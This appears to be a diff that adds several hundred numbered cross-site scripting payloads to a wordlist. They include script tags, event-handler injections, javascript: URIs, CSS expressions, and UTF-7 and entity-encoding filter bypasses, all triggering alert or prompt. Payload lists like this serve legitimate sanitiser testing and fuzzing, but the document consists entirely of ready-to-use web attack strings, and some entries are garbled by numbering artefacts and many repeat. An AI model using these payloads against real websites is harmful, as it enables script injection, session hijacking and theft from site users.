+</ foo="><script>javascript:alert(593)</script>">
+<? foo="><x foo='?><script>javascript:alert(594)</script>'>">
+<! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(595)</script>">
+<% foo><x foo="%><script>javascript:alert(596)</script>">
+<div id=d><x xmlns="><iframe onload=javascript:alert(597)"></div> <script>d.innerHTML=d.innerHTML</script>
+<img \x00src=x onerror="alert(598)">
+<img \x47src=x onerror="javascript:alert(599)">
+<img \x600600src=x onerror="javascript:alert(600)">
+<img \x6012src=x onerror="javascript:alert(601)">
+<img\x47src=x onerror="javascript:alert(602)">
+<img\x6030src=x onerror="javascript:alert(603)">
+<img\x6043src=x onerror="javascript:alert(604)">
+<img\x32src=x onerror="javascript:alert(605)">
+<img\x47src=x onerror="javascript:alert(606)">
+<img\x607607src=x onerror="javascript:alert(607)">
+<img \x47src=x onerror="javascript:alert(608)">
+<img \x34src=x onerror="javascript:alert(609)">
+<img \x39src=x onerror="javascript:alert(610)">
+<img \x00src=x onerror="javascript:alert(611)">
+<img src\x09=x onerror="javascript:alert(612)">
+<img src\x6130=x onerror="javascript:alert(613)">
+<img src\x6143=x onerror="javascript:alert(614)">
+<img src\x32=x onerror="javascript:alert(615)">
+<img src\x6162=x onerror="javascript:alert(616)">
+<img src\x617617=x onerror="javascript:alert(617)">
+<img src\x00=x onerror="javascript:alert(618)">
+<img src\x47=x onerror="javascript:alert(619)">
+<img src=x\x09onerror="javascript:alert(620)">
+<img src=x\x6210onerror="javascript:alert(621)">
+<img src=x\x622622onerror="javascript:alert(622)">
+<img src=x\x6232onerror="javascript:alert(623)">
+<img src=x\x6243onerror="javascript:alert(624)">
+<img[a][b][c]src[d]=x[e]onerror=[f]"alert(625)">
+<img src=x onerror=\x09"javascript:alert(626)">
+<img src=x onerror=\x6270"javascript:alert(627)">
+<img src=x onerror=\x628628"javascript:alert(628)">
+<img src=x onerror=\x6292"javascript:alert(629)">
+<img src=x onerror=\x32"javascript:alert(630)">
+<img src=x onerror=\x00"javascript:alert(631)">
+<a href=java&#632&#2&#3&#4&#5&#6&#7&#8&#632632&#6322script:javascript:alert(632)>XXX</a>
+<img src="x` `<script>javascript:alert(633)</script>"` `>
+<img src onerror /" '"= alt=javascript:alert(634)//">
+<title onpropertychange=javascript:alert(635)></title><title title=>
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(636)></a>">
+<!--[if]><script>javascript:alert(637)</script -->
+<!--[if<img src=x onerror=javascript:alert(638)//]> -->
+<object id="x" classid="clsid:CB927D6392-4FF7-4a9e-A63969-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C6397-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(639)" style="behavior:url(#x);"><param name=postdomevents /></object>
+<a style="-o-link:'javascript:javascript:alert(640)';-o-link-source:current">X
+<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(641)'}{}*{-o-link-source:current}]{color:red};</style>
+<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(642))%7d
+<style>@import "data:,*%7bx:expression(javascript:alert(643))%7D";</style>
+<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(644);">XXX</a></a><a href="javascript:javascript:alert(644)">XXX</a>
+<// style=x:expression\28javascript:alert(645)\29>
+<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(646))}</style>
+<div style="list-style:url(http://foo.f)\20url(javascript:javascript:alert(647));">X
+<script>({set/**/$($){_/**/setter=$,_=javascript:alert(648)}}).$=eval</script>
+<script>({0:#0=eval/#0#/#0#(javascript:alert(649))})</script>
+<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(650)}),x</script>
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(651)')()</script>
+<meta charset="mac-farsi">¼script¾javascript:alert(652)¼/script¾
+X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(653)` >
+654<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x4654vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(654)&gt;`>
+655<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(655)&gt;>
+656<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(656) strokecolor=white strokeweight=656000px from=0 to=656000 /></a>
+<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(657)">XXX</a>
+<event-source src="%(event)s" onload="javascript:alert(658)">
+<a href="javascript:javascript:alert(659)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">
+<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#660660;src=x:x&#660660;onerror&#660660;=javascript:alert(660)&gt;">
+<script>javascript:alert(661)</script>
+<IMG SRC="javascript:javascript:alert(662);">
+<IMG SRC=javascript:javascript:alert(663)>
+<IMG SRC=`javascript:javascript:alert(664)`>
+<FRAMESET><FRAME SRC="javascript:javascript:alert(665);"></FRAMESET>
+<BODY ONLOAD=javascript:alert(666)>
+<BODY ONLOAD=javascript:javascript:alert(667)>
+<IMG SRC="jav    ascript:javascript:alert(668);">
+<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(669)>
+<IMG SRC="javascript:javascript:alert(670)"
+<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(671);">
+<IMG DYNSRC="javascript:javascript:alert(672)">
+<IMG LOWSRC="javascript:javascript:alert(673)">
+<BGSOUND SRC="javascript:javascript:alert(674);">
+<BR SIZE="&{javascript:alert(675)}">
+<LINK REL="stylesheet" HREF="javascript:javascript:alert(676);">
+<STYLE>li {list-style-image: url("javascript:javascript:alert(677)");}</STYLE><UL><LI>XSS
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(678);">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(679);">
+<IFRAME SRC="javascript:javascript:alert(680);"></IFRAME>
+<TABLE BACKGROUND="javascript:javascript:alert(681)">
+<TABLE><TD BACKGROUND="javascript:javascript:alert(682)">
+<DIV STYLE="background-image: url(javascript:javascript:alert(683))">
+<DIV STYLE="width:expression(javascript:alert(684));">
+<IMG STYLE="xss:expr/*XSS*/ession(javascript:alert(685))">
+<XSS STYLE="xss:expression(javascript:alert(686))">
+<STYLE TYPE="text/javascript">javascript:alert(687);</STYLE>
+<STYLE>.XSS{background-image:url("javascript:javascript:alert(688)");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:javascript:alert(689)")}</STYLE>
+<!--[if gte IE 4]><SCRIPT>javascript:alert(690);</SCRIPT><![endif]-->
+<BASE HREF="javascript:javascript:alert(691);//">
+<OBJECT classid=clsid:ae24fdae-03c6-692692d692-8b76-0080c744f389><param name=url value=javascript:javascript:alert(692)></OBJECT>
+<HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(693)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(694)&lt;/SCRIPT&gt;"></BODY></HTML>
+<form id="test" /><button form="test" formaction="javascript:javascript:alert(695)">X
+<body onscroll=javascript:alert(696)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+<P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(697)">
+<STYLE>a{background:url('s698' 's2)}@import javascript:javascript:alert(698);');}</STYLE>
+<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(699)&&;&&<&&/script&&>
+<SCRIPT onreadystatechange=javascript:javascript:alert(700);></SCRIPT>
+<style onreadystatechange=javascript:javascript:alert(701);></style>
+<?xml version="702.0"?><html:html xmlns:html='http://www.w3.org/702999/xhtml'><html:script>javascript:alert(702);</html:script></html:html>
+<embed code=javascript:javascript:alert(703);></embed>
+<frameset onload=javascript:javascript:alert(704)></frameset>
+<object onerror=javascript:javascript:alert(705)>
+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:alert(706);">]]</C><X></xml>
+<IMG SRC=&{javascript:alert(707);};>
+<a href="jav&#65ascript:javascript:alert(708)">test708</a>
+<a href="jav&#97ascript:javascript:alert(709)">test709</a>
+<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(710)&amp;gt;>">
+';alert(711))//';alert(711))//";
+alert(712))//";alert(712))//--
+></SCRIPT>">'><SCRIPT>alert(713))</SCRIPT>
+<IMG SRC="javascript:alert(714);">
+<IMG SRC=javascript:alert(715)>
+<IMG SRC=JaVaScRiPt:alert(716)>
+<IMG SRC=javascript:alert(717)>
+<IMG SRC=`javascript:alert(718)`>
+<a onmouseover="alert(719)">xxs link</a>
+<a onmouseover=alert(720)>xxs link</a>
+<IMG """><SCRIPT>alert(721)</SCRIPT>">
+<IMG SRC=javascript:alert(722))>
+<IMG SRC=# onmouseover="alert(723)">
+<IMG SRC= onmouseover="alert(724)">
+<IMG onmouseover="alert(725)">
+<IMG SRC="jav	ascript:alert(726);">
+<IMG SRC="jav&#x09;ascript:alert(727);">
+<IMG SRC="jav&#x0A;ascript:alert(728);">
+<IMG SRC="jav&#x0D;ascript:alert(729);">
+perl -e 'print "<IMG SRC=java\0script:alert(730)>";' > out
+<IMG SRC=" &#14;  javascript:alert(731);">
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(732)>
+<<SCRIPT>alert(733);//<</SCRIPT>
+<IMG SRC="javascript:alert(734)"
+\";alert(735);//
+</TITLE><SCRIPT>alert(736);</SCRIPT>
+<INPUT TYPE="IMAGE" SRC="javascript:alert(737);">
+<BODY BACKGROUND="javascript:alert(738)">
+<IMG DYNSRC="javascript:alert(739)">
+<IMG LOWSRC="javascript:alert(740)">
+<STYLE>li {list-style-image: url("javascript:alert(741)");}</STYLE><UL><LI>XSS</br>
+<BODY ONLOAD=alert(742)>
+<BGSOUND SRC="javascript:alert(743);">
+<BR SIZE="&{alert(744)}">
+<LINK REL="stylesheet" HREF="javascript:alert(745);">
+<STYLE>@im\port'\ja\vasc\ript:alert(746)';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(alert(747))">
+exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert(748))'>
+<STYLE TYPE="text/javascript">alert(749);</STYLE>
+<STYLE>.XSS{background-image:url("javascript:alert(750)");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:alert(751)")}</STYLE>
+<STYLE type="text/css">BODY{background:url("javascript:alert(752)")}</STYLE>
+<XSS STYLE="xss:expression(alert(753))">
+¼script¾alert(754)¼/script¾
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(755);">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(756);">
+<IFRAME SRC="javascript:alert(757);"></IFRAME>
+<IFRAME SRC=# onmouseover="alert(758)"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:alert(759);"></FRAMESET>
+<TABLE BACKGROUND="javascript:alert(760)">
+<TABLE><TD BACKGROUND="javascript:alert(761)">
+<DIV STYLE="background-image: url(javascript:alert(762))">
+<DIV STYLE="background-image: url(&#1;javascript:alert(763))">
+<DIV STYLE="width: expression(alert(764));">
+<BASE HREF="javascript:alert(765);//">
+<? echo('<SCR)';echo('IPT>alert(766)</SCRIPT>'); ?>
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert(767)</SCRIPT>">
+ <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert(768);+ADw-/SCRIPT+AD4-
+<img src=`%00`&NewLine; onerror=alert(769)&NewLine;
+<script /*%00*/>/*%00*/alert(770)/*%00*/</script /*%00*/
+<iframe/src="data:text/html,<svg &#771771771;&#7717710;load=alert(771)>">
+<meta content="&NewLine; 772 &NewLine;; JAVASCRIPT&colon; alert(772)" http-equiv="refresh"/>
+<form><iframe &#09;&#7730;&#773773; src="javascript&#58;alert(773)"&#773773;&#7730;&#09;;>
+http://www.google<script .com>alert(774)</script
+<script ^__^>alert(775))</script ^__^
+</style &#32;><script &#32; :-(>/**/alert(776)/**/</script &#32; :-(
+&#00;</form><input type&#6777;"date" onfocus="alert(777)">
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(778)&NewLine;>X</a>
+<script ~~~>alert(779)</script ~~~>
+<iframe/%00/ src=javaSCRIPT&colon;alert(780)
+<%<!--'%><script>alert(781);</script -->
+<script src="data:text/javascript,alert(782)"></script>
+<iframe/onreadystatechange=alert(783)
+<svg/onload=alert(784)
+<input type="text" value=`` <div/onmouseover='alert(785)'>X</div>
+http://www.<script>alert(786)</script .com
+<svg><script ?>alert(787)
+<img src=`xx:xx`onerror=alert(788)>
+<meta http-equiv="refresh" content="0;javascript&colon;alert(789)"/>
+<script>+-+-790-+-+alert(790)</script>
+<body/onload=&lt;!--&gt;&#7910alert(791)>
+<script itworksinallbrowsers>/*<script* */alert(792)</script
+<img src ?itworksonchrome?\/onerror = alert(793)
+<svg><script onlypossibleinopera:-)> alert(794)
+<script x> alert(795) </script 795=2
+<div/onmouseover='alert(796)'> style="x:">
+<--`<img/src=` onerror=alert(797)> --!>
+<div style="position:absolute;top:0;left:0;width:79800%;height:79800%" onmouseover="prompt(798)" onclick="alert(798)">x</button>
+<form><button formaction=javascript&colon;alert(799)>CLICKME
+‘; alert(800);
+‘)alert(801);//
+<ScRiPt>alert(802)</sCriPt>
+<IMG SRC=jAVasCrIPt:alert(803)>
+<IMG SRC=”javascript:alert(804);”>
+<IMG SRC=javascript:alert(805)>
+<IMG SRC=javascript:alert(806)>
+<img src=xss onerror=alert(807)>
+<img src=`%00`&NewLine; onerror=alert(808)&NewLine;
+<script /*%00*/>/*%00*/alert(809)/*%00*/</script /*%00*/
+<iframe/src="data:text/html,<svg &#810810810;&#8108100;load=alert(810)>">
+<meta content="&NewLine; 811 &NewLine;; JAVASCRIPT&colon; alert(811)" http-equiv="refresh"/>
+<form><iframe &#09;&#8120;&#812812; src="javascript&#58;alert(812)"&#812812;&#8120;&#09;;>
+http://www.google<script .com>alert(813)</script
+<script ^__^>alert(814))</script ^__^
+</style &#32;><script &#32; :-(>/**/alert(815)/**/</script &#32; :-(
+&#00;</form><input type&#6816;"date" onfocus="alert(816)">
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(817)&NewLine;>X</a>
+<script ~~~>alert(818)</script ~~~>
+<iframe/%00/ src=javaSCRIPT&colon;alert(819)
+<%<!--'%><script>alert(820);</script -->
+<script src="data:text/javascript,alert(821)"></script>
+<iframe/onreadystatechange=alert(822)
+<svg/onload=alert(823)
+<input type="text" value=`` <div/onmouseover='alert(824)'>X</div>
+http://www.<script>alert(825)</script .com
+<svg><script ?>alert(826)
+<img src=`xx:xx`onerror=alert(827)>
+<meta http-equiv="refresh" content="0;javascript&colon;alert(828)"/>
+<script>+-+-829-+-+alert(829)</script>
+<body/onload=&lt;!--&gt;&#8300alert(830)>
+<script itworksinallbrowsers>/*<script* */alert(831)</script
+<img src ?itworksonchrome?\/onerror = alert(832)
+<svg><script onlypossibleinopera:-)> alert(833)
+<script x> alert(834) </script 834=2
+<div/onmouseover='alert(835)'> style="x:">
+<--`<img/src=` onerror=alert(836)> --!>
+<div style="xg-p:absolute;top:0;left:0;width:83700%;height:83700%" onmouseover="prompt(837)" onclick="alert(837)">x</button>
+<form><button formaction=javascript&colon;alert(838)>CLICKME
+‘;alert(839))//’;alert(839))//”;alert(839))//”;alert(839))//–></SCRIPT>”>’><SCRIPT>alert(839))</SCRIPT>
+<IMG “””><SCRIPT>alert(840)</SCRIPT>”>
+<IMG SRC=javascript:alert(841))>
+<IMG SRC=”jav ascript:alert(842);”>
+<IMG SRC=”jav&#x09;ascript:alert(843);”>
+<<SCRIPT>alert(844);//<</SCRIPT>
+%253cscript%253ealert(845)%253c/script%253e
+“><s”%2b”cript>alert(846)</script>
+foo<script>alert(847)</script>
+<scr<script>ipt>alert(848)</scr</script>ipt>
+<BODY BACKGROUND=”javascript:alert(849)”>
+<BODY ONLOAD=alert(850)>
+<INPUT TYPE=”IMAGE” SRC=”javascript:alert(851);”>
+<IMG SRC=”javascript:alert(852)”
+javascript:alert(853)
+<img src="javascript:alert(854);">
+<img src=javascript:alert(855)>
+<"';alert(856))//\';alert(856))//";alert(856))//\";alert(856))//--></SCRIPT>">'><SCRIPT>alert(856))</SCRIPT>
+<IFRAME SRC="javascript:alert(857);"></IFRAME>
+<<SCRIPT>alert(858);//<</SCRIPT>
+<"';alert(859))//\';alert(859))//";alert(859))//\";alert(859))//--></SCRIPT>">'><SCRIPT>alert(859))</SCRIPT>
+';alert(860))//\';alert(860))//";alert(860))//\";alert(860))//--></SCRIPT>">'><SCRIPT>alert(860))<?/SCRIPT>&submit.x=27&submit.y=9&cmd=search
+<script>alert(861)</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510
+<script>alert(862);</script>&search=1
+0&q=';alert(863))//\';alert%2?8863))//";alert(String.fromCharCode?(88,83,83))//\";alert(863)%?29//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83%?2C83))</SCRIPT>&submit-frmGoogleWeb=Web+Search
+<BODY ONLOAD=alert(864)>
+<body onscroll=alert(865)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<form><button formaction="javascript:alert(866)">lol
+<!--<img src="--><img src=x onerror=alert(867)//">
+<![><img src="]><img src=x onerror=alert(868)//">
+<style><img src="</style><img src=x onerror=alert(869)//">
+<? foo="><script>alert(870)</script>">
+<! foo="><script>alert(871)</script>">
+</ foo="><script>alert(872)</script>">
+<? foo="><x foo='?><script>alert(873)</script>'>">
+<! foo="[[[Inception]]"><x foo="]foo><script>alert(874)</script>">
+<% foo><x foo="%><script>alert(875)</script>">
+<svg xmlns="http://www.w3.org/2000/svg">LOL<script>alert(876)</script></svg>
+&lt;SCRIPT&gt;alert(877)&lt;/SCRIPT&gt;
+\\";alert(878);//
+&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(879);&lt;/SCRIPT&gt;
+&lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript&#058;alert(880);\"&gt;
+&lt;BODY BACKGROUND=\"javascript&#058;alert(881)\"&gt;
+&lt;BODY ONLOAD=alert(882)&gt;
+&lt;IMG DYNSRC=\"javascript&#058;alert(883)\"&gt;
+&lt;IMG LOWSRC=\"javascript&#058;alert(884)\"&gt;
+&lt;BGSOUND SRC=\"javascript&#058;alert(885);\"&gt;
+&lt;BR SIZE=\"&{alert(886)}\"&gt;
+&lt;LINK REL=\"stylesheet\" HREF=\"javascript&#058;alert(887);\"&gt;
+&lt;STYLE&gt;li {list-style-image&#58; url(\"javascript&#058;alert(888)\");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
+žscriptualert(889)ž/scriptu
+&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript&#058;alert(890);\"&gt;
+&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http&#58;//;URL=javascript&#058;alert(891);\"
+&lt;IFRAME SRC=\"javascript&#058;alert(892);\"&gt;&lt;/IFRAME&gt;
+&lt;FRAMESET&gt;&lt;FRAME SRC=\"javascript&#058;alert(893);\"&gt;&lt;/FRAMESET&gt;
+&lt;TABLE BACKGROUND=\"javascript&#058;alert(894)\"&gt;
+&lt;TABLE&gt;&lt;TD BACKGROUND=\"javascript&#058;alert(895)\"&gt;
+&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert(896))\"&gt;
+&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert(897))\"&gt;
+&lt;DIV STYLE=\"width&#58; expression(alert(898));\"&gt;
+&lt;STYLE&gt;@im\port'\ja\vasc\ript&#58;alert(899)';&lt;/STYLE&gt;
+&lt;IMG STYLE=\"xss&#58;expr/*XSS*/ession(alert(900))\"&gt;
+&lt;XSS STYLE=\"xss&#58;expression(alert(901))\"&gt;
+xss&#58;ex&#x2F;*XSS*//*/*/pression(alert(902))'&gt;
+&lt;STYLE TYPE=\"text/javascript\"&gt;alert(903);&lt;/STYLE&gt;
+&lt;STYLE&gt;&#46;XSS{background-image&#58;url(\"javascript&#058;alert(904)\");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
+&lt;STYLE type=\"text/css\"&gt;BODY{background&#58;url(\"javascript&#058;alert(905)\")}&lt;/STYLE&gt;
+&lt;SCRIPT&gt;alert(906);&lt;/SCRIPT&gt;
+&lt;BASE HREF=\"javascript&#058;alert(907);//\"&gt;
+&lt;OBJECT classid=clsid&#58;ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript&#058;alert(908)&gt;&lt;/OBJECT&gt;
+d=\"alert(909);\\")\";
+&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\"javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;alert(910);\"&gt;&#93;&#93;&gt;
+&lt;XML ID=\"xss\"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=\"javas&lt;!-- --&gt;cript&#58;alert(911)\"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
+&lt;t&#58;set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;alert(912)&lt;/SCRIPT&gt;\"&gt;
+echo('IPT&gt;alert(913)&lt;/SCRIPT&gt;'); ?&gt;
+&lt;META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert(914)&lt;/SCRIPT&gt;\"&gt;
+&lt;HEAD&gt;&lt;META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(915);+ADw-/SCRIPT+AD4-
+&lt;IMG SRC=\"javascript&#058;alert(916)\"
+&lt;&lt;SCRIPT&gt;alert(917);//&lt;&lt;/SCRIPT&gt;
+&lt;BODY onload!#$%&()*~+-_&#46;,&#58;;?@&#91;/|\&#93;^`=alert(918)&gt;
+&lt;IMG SRC=\"   javascript&#058;alert(919);\"&gt;
+perl -e 'print \"&lt;SCR\0IPT&gt;alert(920)&lt;/SCR\0IPT&gt;\";' &gt; out
+perl -e 'print \"&lt;IMG SRC=java\0script&#058;alert(921)&gt;\";' &gt; out
+&lt;IMG SRC=\"jav&#x0D;ascript&#058;alert(922);\"&gt;
+&lt;IMG SRC=\"jav&#x0A;ascript&#058;alert(923);\"&gt;
+&lt;IMG SRC=\"jav&#x09;ascript&#058;alert(924);\"&gt;
+&lt;IMG SRC=javascript&#058;alert(925)&gt;
+&lt;IMG SRC=javascript&#058;alert(926))&gt;
+&lt;IMG \"\"\"&gt;&lt;SCRIPT&gt;alert(927)&lt;/SCRIPT&gt;\"&gt;
+&lt;IMG SRC=`javascript&#058;alert(928)`&gt;
+&lt;IMG SRC=javascript&#058;alert(929)&gt;
+&lt;IMG SRC=JaVaScRiPt&#058;alert(930)&gt;
+&lt;IMG SRC=javascript&#058;alert(931)&gt;
+&lt;IMG SRC=\"javascript&#058;alert(932);\"&gt;
+';alert(933))//\';alert(933))//\";alert(933))//\\";alert(933))//--&gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(933))&lt;/SCRIPT&gt;
+';alert(934))//\';alert(934))//";alert(934))//\";alert(934))//--></SCRIPT>">'><SCRIPT>alert(934))</SCRIPT>
+<IMG SRC="javascript:alert(935);">
+<IMG SRC=javascript:alert(936)>
+<IMG SRC=javascrscriptipt:alert(937)>
+<IMG SRC=JaVaScRiPt:alert(938)>
+<IMG """><SCRIPT>alert(939)</SCRIPT>">
+<IMG SRC=" &#14;  javascript:alert(940);">
+<<SCRIPT>alert(941);//<</SCRIPT>
+<SCRIPT>a=/XSS/alert(942)</SCRIPT>
+\";alert(943);//
+</TITLE><SCRIPT>alert(944);</SCRIPT>
+¼script¾alert(945)¼/script¾
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(946);">
+<IFRAME SRC="javascript:alert(947);"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:alert(948);"></FRAMESET>
+<TABLE BACKGROUND="javascript:alert(949)">
+<TABLE><TD BACKGROUND="javascript:alert(950)">
+<DIV STYLE="background-image: url(javascript:alert(951))">
+<DIV STYLE="width: expression(alert(952));">
+<STYLE>@im\port'\ja\vasc\ript:alert(953)';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(alert(954))">
+<XSS STYLE="xss:expression(alert(955))">
+exp/*<A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert(956))'>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(957)&lt;/SCRIPT&gt;"></BODY></HTML>
+<form id="test" /><button form="test" formaction="javascript:alert(958)">TESTHTML5FORMACTION
+<form><button formaction="javascript:alert(959)">crosssitespt
+<frameset onload=alert(960)>
+<!--<img src="--><img src=x onerror=alert(961)//">
+<style><img src="</style><img src=x onerror=alert(962)//">
+<embed src="javascript:alert(963)">
+<? foo="><script>alert(964)</script>">
+<! foo="><script>alert(965)</script>">
+</ foo="><script>alert(966)</script>">
+<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(967)}),x</script>
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(968)')()</script>
+<script src="#">{alert(969)}</script>;969
+<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(970)',384,null,'rsa-dual-use')</script>
+<svg xmlns="#"><script>alert(971)</script></svg>
+<svg onload="javascript:alert(972)" xmlns="#"></svg>
+<iframe xmlns="#" src="javascript:alert(973)"></iframe>
++ADw-script+AD4-alert(974)+ADw-/script+AD4-
+%2BADw-script+AD4-alert(975)%2BADw-/script%2BAD4-
++ACIAPgA8-script+AD4-alert(976)+ADw-/script+AD4APAAi-
+%253cscript%253ealert(977)%253c/script%253e
+“><s”%2b”cript>alert(978)</script>
+“><ScRiPt>alert(979)</script>
+“><<script>alert(980);//<</script>
+foo<script>alert(981)</script>
+<scr<script>ipt>alert(982)</scr</script>ipt>
+‘; alert(983); var foo=’
+foo\’; alert(984);//’;
+</script><script >alert(985)</script>
+<img src=asdf onerror=alert(986)>
+<BODY ONLOAD=alert(987)>
+<script>alert(988)</script>
+"><script>alert(989))</script>
+<video src=990 onerror=alert(990)>
+<audio src=991 onerror=alert(991)>
+';alert(992))//';alert(992))//";alert(992))//";alert(992))//--></SCRIPT>">'><SCRIPT>alert(992))</SCRIPT>
+0\"autofocus/onfocus=alert(993)--><video/poster/onerror=prompt(2)>"-confirm(3)-"
+<IMG SRC="javascript:alert(994);">
+<IMG SRC=javascript:alert(995)>
+<IMG SRC=JaVaScRiPt:alert(996)>
+<IMG SRC=javascript:alert(997)>
+<IMG SRC=`javascript:alert(998)`>
+<a onmouseover="alert(999)">xxs link</a>
+<a onmouseover=alert(1000)>xxs link</a>
+<IMG """><SCRIPT>alert(1001)</SCRIPT>">
+<IMG SRC=javascript:alert(1002))>
+<IMG SRC=# onmouseover="alert(1003)">
+<IMG SRC= onmouseover="alert(1004)">
+<IMG onmouseover="alert(1005)">
+<IMG SRC=/ onerror="alert(1006))"></img>
+<IMG SRC="jav	ascript:alert(1007);">
+<IMG SRC="jav&#x09;ascript:alert(1008);">
+<IMG SRC="jav&#x0A;ascript:alert(1009);">
+<IMG SRC="jav&#x0D;ascript:alert(1010);">
+<IMG SRC=" &#14;  javascript:alert(1011);">
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(1012)>
+<<SCRIPT>alert(1013);//<</SCRIPT>
+<IMG SRC="javascript:alert(1014)"
+\";alert(1015);//
+</script><script>alert(1016);</script>
+</TITLE><SCRIPT>alert(1017);</SCRIPT>
+<INPUT TYPE="IMAGE" SRC="javascript:alert(1018);">
+<BODY BACKGROUND="javascript:alert(1019)">
+<IMG DYNSRC="javascript:alert(1020)">
+<IMG LOWSRC="javascript:alert(1021)">
+<STYLE>li {list-style-image: url("javascript:alert(1022)");}</STYLE><UL><LI>XSS</br>
+<BODY ONLOAD=alert(1023)>
+<BGSOUND SRC="javascript:alert(1024);">
+<BR SIZE="&{alert(1025)}">
+<LINK REL="stylesheet" HREF="javascript:alert(1026);">
+<STYLE>@im\port'\ja\vasc\ript:alert(1027)';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(alert(1028))">
+xss:ex/*XSS*//*/*/pression(alert(1029))'>
+<STYLE TYPE="text/javascript">alert(1030);</STYLE>
